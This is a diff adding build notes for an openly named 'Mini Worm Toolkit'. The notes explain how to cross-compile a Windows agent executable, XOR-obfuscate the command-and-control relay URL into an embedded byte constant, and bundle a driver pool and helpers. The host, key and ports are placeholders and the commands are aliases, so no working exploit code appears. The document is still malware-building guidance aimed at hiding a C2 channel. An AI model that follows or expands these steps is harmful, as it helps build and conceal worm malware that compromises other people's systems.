@@ -1,0 +1,33 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# Operator build notes (aliases only)
+
+# Minimum: default features, 64-bit Windows GNU-style cross link
+cross-build --release --target windows-x64
+
+# Embed relay URL (do not use the private XOR key or env-var name)
+# 1. Take the HTTPS base URL of the edge relay
+# 2. XOR each byte with a build-time constant K
+# 3. Store the result as CHANNEL_HOST_BYTES
+# 4. The agent decoder MUST actually decode this (the private tree
+#    currently fails to; this outline assumes a corrected decoder)
+
+CHANNEL_HOST_BYTES=<opaque>
+DRIVER_POOL_DIR=./driver_pool
+HELPER_DIR=./helpers
+cross-build --release --target windows-x64
+
+# Optional bind overrides
+LOCAL_RELAY_BIND=127.0.0.1:<port>
+VIEW_PORT=<port>
+
+# First-time toolchain
+add-target windows-x64
+install mingw-style linker
+
+# Output (filename is an alias)
+# target/windows-x64/release/veneficus_agent.exe
